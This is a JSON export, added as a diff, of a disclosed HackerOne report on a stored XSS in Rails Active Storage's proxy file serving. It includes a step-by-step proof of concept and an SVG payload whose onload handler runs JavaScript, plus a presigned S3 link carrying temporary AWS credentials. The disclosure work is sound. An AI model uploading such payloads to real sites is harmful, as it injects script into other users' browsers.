@@ -1,0 +1,128 @@
+{
+  "id": 949513,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NDk1MTM=",
+  "url": "https://hackerone.com/reports/949513",
+  "title": "XSS by file (Active Storage `Proxying`)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-08-02T05:13:31.181Z",
+  "submitted_at": "2020-08-02T05:13:31.245Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-09-01T22:51:37.236Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-09-01T22:51:37.182Z",
+  "team_member_agreed_on_going_public_at": "2020-09-01T19:14:06.796Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello,\nI've seen similar issues with #407319 and #429868 occur with Active Storage's new File serving strategies `Proxying`.\n\nCommit is https://github.com/rails/rails/commit/dfb5a82b259e134eac89784ac4ace0c44d1b4aee.\n\n```ruby\n# https://github.com/rails/rails/blob/master/activestorage/app/controllers/concerns/active_storage/set_headers.rb#L9\n      response.headers[\"Content-Disposition\"] = ActionDispatch::Http::ContentDisposition.format \\\n        disposition: params[:disposition] || \"inline\", filename: blob.filename.\n```\n\n```ruby\n# https://github.com/rails/rails/blob/master/activestorage/app/controllers/active_storage/blobs/proxy_controller.rb\n\n# Proxy files through application. This avoids having a redirect and makes files easier to cache.\nclass ActiveStorage::Blobs::ProxyController < ActiveStorage::BaseController\n  include ActiveStorage::SetBlob\n  include ActiveStorage::SetHeaders\n\n  def show\n    http_cache_forever public: true do\n      set_content_headers_from @blob\n      stream @blob\n    end\n  end\nend  \n```\n\nSince `inline` can be set regardless of the file type, XSS is possible when a malicious file is uploaded.\n\n### Proof of concept\n\n#### 1. Preparing the server\n\n```\n$ rails new proxy_xss --skip-bundle --skip-webpack-install\n$ cd proxy_xss/\n```\n\nEdit Gemfile.\n\n```ruby\nsource 'https://rubygems.org'\ngit_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\n\nruby '2.7.1'\n\ngem 'rails', github: \"rails/rails\", branch: \"master\"\ngem 'sqlite3', '~> 1.4'\ngem 'puma', '~> 4.1'\n\ngem 'bootsnap', '>= 1.4.2', require: false\n\ngroup :development do\n  gem 'listen', '~> 3.2'\nend\n```\n\n```\n$ bundle install\n...\n\n$ head Gemfile.lock\nGIT\n  remote: https://github.com/rails/rails.git\n  revision: 11f54e12b992f6c8d29fd9bedd89ac438a928a2f\n  branch: master\n  specs:\n    actioncable (6.1.0.alpha)\n      actionpack (= 6.1.0.alpha)\n      activesupport (= 6.1.0.alpha)\n      nio4r (~> 2.0)\n      websocket-driver (>= 0.6.1)\n```\n\n```\n$ bundle exec rails active_storage:install\n$ bundle exec rails g resource user name:text\n$ bundle exec rails db:migrate\n```\n\nEdit app files.\n\n```ruby\n# controllers/users_controller.rb\nclass UsersController < ApplicationController\n\n  def new\n    @user = User.new\n  end\n\n  def create\n    user = User.create!(user_params)\n    redirect_to \"/users/#{user.id}\"\n  end\n\n  def show\n    @user = User.find(params[:id])\n  end\n\n  private\n    def user_params\n      params.require(:user).permit(:name, :image)\n    end\nend\n```\n\n```ruby\n# models/user.rb\nclass User < ApplicationRecord\n  has_one_attached :image\nend\n```\n\n```erb\n# views/layouts/application.html.erb\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>ProxyXss</title>\n    <%= csrf_meta_tags %>\n    <%= csp_meta_tag %>\n  </head>\n\n  <body>\n    <%= yield %>\n  </body>\n</html>\n```\n\n```erb\n# views/user/new.html.erb\n<%= form_with model: @user, local: true, :url => {:action => :create}  do |form| %>\n  <%= form.text_area :name %><br>\n  <%= form.file_field :image %><br>\n  <%= form.submit %>\n<% end %>\n```\n\n```erb\n# views/user/show.html.erb\n<% if @user.image.attached? %>\n  <%= image_tag @user.image %>\n<% end %>\n```\n\n#### 2. Obtain url\n\nStart server.\n\n```\nrails s\n```\n\nOpen `http://localhost:3000/users/new` in your browser, Upload the following file as `alert.svg`.\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<svg xmlns='http://www.w3.org/2000/svg' width=\"200px\" height=\"200px\" onload=\"javascript:alert(location)\">\n</svg>\n```\n\nAfter that, use the developer tool to obtain the redirected URL.\n\n```\nhttp://localhost:3000/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ed4ee8109834f4dd747bfb68d7a7ddc2e43e8f69/alert.svg\n```\n\n#### 3. XSS\n\nRewrite `redirect` in URL to `proxy` and alert will appear when opening URL directly in browser.\n\n```\nhttp://localhost:3000/rails/active_storage/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ed4ee8109834f4dd747bfb68d7a7ddc2e43e8f69/alert.svg\n```\n\n{F933309}\n\n## Impact\n\nXSS is possible if attacker can upload files using Active storage.\nThis commit has not been released yet, so it only affects services using Rails on the master branch.\n(Maybe `Hey` etc. https://gist.github.com/dhh/782fb925b57450da28c1e15656779556#file-gemfile-L3)\n\nIn addition, since the csp header is not output for the svg file (https://github.com/rails/rails/blob/master/actionpack/lib/action_dispatch/http/content_security_policy.rb#L20), it can be avoided even if csp is set.",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 933309,
+      "file_name": "__________2020-08-02_13.56.07.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y8cVzeAnppMhG3nekekqk4WM?response-content-disposition=attachment%3B%20filename%3D%22__________2020-08-02_13.56.07.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-08-02_13.56.07.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQVLL3MOL%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T174848Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJHMEUCICXZ2t25W06qgJGfQEKgCHiLu2RwBCYfTtrgA3QZzFZjAiEA993Cf7iOatTQrB5x5IZxlmcwuY3LP%2Fa2bNKX4ASYmP0qsgUIQBADGgwwMTM2MTkyNzQ4NDkiDIEqMtXaoEpelmH7SCqPBXgJYEDkYwMAT0lhTX8qRa%2BqzeESV1rrpvOy%2B%2Bjcv%2BVfIEepp0Eq3HqN2NrCJhJhHfL%2FlVIW%2FFU1Nzp8sZ884kZpYumsSnbe9lZjARKcp4zyfvDNeudfC2haYUxbeBcmi10scQzjuqTT39xWW1Q%2F0Rij2kEsebFuSbUMe7KSHflFCUzZwPTopHlZ5okaWMJmjlNScPEDtkmyypxf8kAV9RNHug8RG%2FFRj3CZ8qcNIEneMW7L4r%2Bbc9Qe1FiwJnGuuugiRvWSUihQwu9dkkT7eMqjDdr4Q2YmKKzORy7YrxRR23ImvLw6aHUjIlu7zE4GbmwrY9g6eVZP%2FPHxHGd%2Bzbv14iMnmbbUUOeIaSJ9le4Sj8pBIRIgANs%2Fr34AK9GPtxrpmKMUzzOz8gaBxf0D5o2F9C0fxOF51mZvEutyCjUVgIlMTPyhQ%2BMP1FmPyvDtX%2FS9ClSPeZMJx3kptRriSnWTR98EvM8w3JXoCSR6EzcIfv8eOYxl9WbcxZWs%2FP7%2F3x0pWgfdAHT7qeBu6vbyXql4qypkowJp6vZLPX1jP%2BDXMaqMJzZs4UhYZe15j6wX99qHKRVQJoZHKJCwqarVX5dn3OeztUZUaqTzDRUiNCNMmd%2FECiaRP3V9JaUZ6afMqtNIlkbCvmkuQPCuiHnjJKJAjrSvx7TavC%2BQWhwCyo5l71X0wAPWUQEm4BcgcosaIvgb1s8kij8dth14zpM3d%2FmYKmPK5ORTuK4LllFLtMIDmpYQgGl7%2FgPjhodovfY2JeSpFWHh1gVJI9v4929bfLEGL3nRVjqM1Z8HQcL4WzNeCkQdtZ8IVpkxRNmfqu234ulN5MLeGiAc0B9elzqZHSKeBgXJGBHK%2BA9bOWF%2Br04wpabYzwY6sQFvFOv9hGQXzF%2B7IztrfF1YvNzhhZIz4vJscNSGXou%2FzQ92vv14JymGZk6XltXiB1sbY0m%2Bf8J4XSWtDJY3IL82BGAeUyLbJnjj35p9uJGkUcsUPXxMm7wTOV0O5z2aS30tvZxBw2WdhXHR06AXH5BQeiBXEfdSXzSt5El2Y7m6M9WNdUbYZiT9DfhUi1T5WvCNXTGsu3Raj7dUylHWfKKfFC1s0%2BLcRRM5P39b0qukX2Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=661458707f909782a36e3134fdbcabfed7f38563cbf38ca62cf22c15fd02c872",
+      "file_size": 579944,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-10-01T19:14:06.906Z",
+  "allow_singular_disclosure_after": -176164481.1784806,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "ali",
+    "prinzhorn",
+    "thiagomarques"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
